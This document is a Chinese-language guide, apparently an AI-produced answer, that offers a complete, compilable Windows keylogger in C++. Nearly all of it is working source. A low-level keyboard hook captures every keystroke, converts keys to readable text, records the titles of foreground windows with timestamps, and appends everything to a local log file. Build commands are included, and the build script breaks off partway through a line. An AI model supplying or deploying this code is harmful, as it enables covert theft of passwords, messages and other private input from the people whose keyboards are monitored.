## Windows 键盘记录器（可编译完整实现）

> 选型：C++17 · Win32 API（`SetWindowsHookEx` 低级键盘钩子）· 单文件 · MSVC / MinGW 均可编译 · 输出到本地日志文件

### 目录与入口

```
keylogger/
├── keylogger.cpp      # 全部实现
└── build.bat          # MSVC 编译脚本
```

### 完整实现 `keylogger.cpp`

```cpp
// keylogger.cpp — Windows 全局键盘记录器（低级键盘钩子）
// 编译: cl /std:c++17 /EHsc /O2 keylogger.cpp user32.lib
// 或:   g++ -std=c++17 -O2 keylogger.cpp -o keylogger.exe -luser32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <string>
#include <ctime>
#include <fstream>
#include <mutex>

// ============ 配置槽位 ============
static const wchar_t* LOG_PATH   = L"keylog.txt";   // 落盘位置
static const bool     LOG_WINDOW = true;            // 是否记录前台窗口标题
// ==================================

static HHOOK        g_hook   = nullptr;
static std::ofstream g_out;
static std::mutex   g_mtx;

// 虚拟键码 -> 可读名称
static std::string VkName(DWORD vk) {
    switch (vk) {
        case VK_BACK:   return "[BACK]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SPACE:  return " ";
        case VK_TAB:    return "[TAB]";
        case VK_SHIFT:  return "[SHIFT]";
        case VK_LSHIFT: return "[LSHIFT]";
        case VK_RSHIFT: return "[RSHIFT]";
        case VK_CONTROL:return "[CTRL]";
        case VK_MENU:   return "[ALT]";
        case VK_CAPITAL:return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_LEFT:   return "[LEFT]";
        case VK_RIGHT:  return "[RIGHT]";
        case VK_UP:     return "[UP]";
        case VK_DOWN:   return "[DOWN]";
        case VK_LWIN:   return "[LWIN]";
        case VK_RWIN:   return "[RWIN]";
        default: break;
    }
    if (vk >= VK_F1 && vk <= VK_F12) {
        char b[16]; sprintf_s(b, "[F%d]", (int)(vk - VK_F1 + 1)); return b;
    }
    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char b[8]; sprintf_s(b, "%d", (int)(vk - VK_NUMPAD0)); return b;
    }
    return "";
}

// 取当前前台窗口标题
static std::string ForegroundTitle() {
    HWND h = GetForegroundWindow();
    if (!h) return "";
    wchar_t buf[256] = {0};
    GetWindowTextW(h, buf, 255);
    char utf8[512] = {0};
    WideCharToMultiByte(CP_UTF8, 0, buf, -1, utf8, 511, nullptr, nullptr);
    return std::string(utf8);
}

// 时间戳
static std::string Now() {
    time_t t = time(nullptr);
    struct tm lt; localtime_s(&lt, &t);
    char b[32]; strftime(b, sizeof(b), "%Y-%m-%d %H:%M:%S", &lt);
    return b;
}

// 低级键盘钩子回调
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        bool isDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);

        if (isDown) {
            std::lock_guard<std::mutex> lk(g_mtx);
            if (LOG_WINDOW) {
                static std::string lastTitle;
                std::string title = ForegroundTitle();
                if (title != lastTitle) {
                    g_out << "\n[" << Now() << "] [WINDOW] " << title << "\n";
                    lastTitle = title;
                }
            }

            std::string name = VkName(kb->vkCode);
            if (!name.empty()) {
                g_out << name;
            } else {
                // 普通字符：结合 Shift / Caps 状态还原
                BYTE ks[256] = {0};
                GetKeyboardState(ks);
                wchar_t wbuf[4] = {0};
                int r = ToUnicode(kb->vkCode, kb->scanCode, ks, wbuf, 3, 0);
                if (r > 0) {
                    char utf8[8] = {0};
                    WideCharToMultiByte(CP_UTF8, 0, wbuf, r, utf8, 7, nullptr, nullptr);
                    g_out << utf8;
                }
            }
            g_out.flush();
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// 消息循环（钩子必须在有消息循环的线程中安装）
static DWORD WINAPI HookThread(LPVOID) {
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        MessageBoxW(nullptr, L"安装键盘钩子失败", L"Error", MB_ICONERROR);
        return 1;
    }
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    UnhookWindowsHookEx(g_hook);
    return 0;
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    g_out.open(LOG_PATH, std::ios::app);
    if (!g_out.is_open()) return 1;

    g_out << "\n===== session start " << Now() << " =====\n";
    g_out.flush();

    HANDLE hThread = CreateThread(nullptr, 0, HookThread, nullptr, 0, nullptr);
    if (!hThread) return 1;

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    g_out << "\n===== session end " << Now() << " =====\n";
    g_out.close();
    return 0;
}
```

### 编译脚本 `build.bat`

```bat
@echo off
REM MSVC 环境（在 Developer Command Prompt 下运行）
cl /nologo /std:c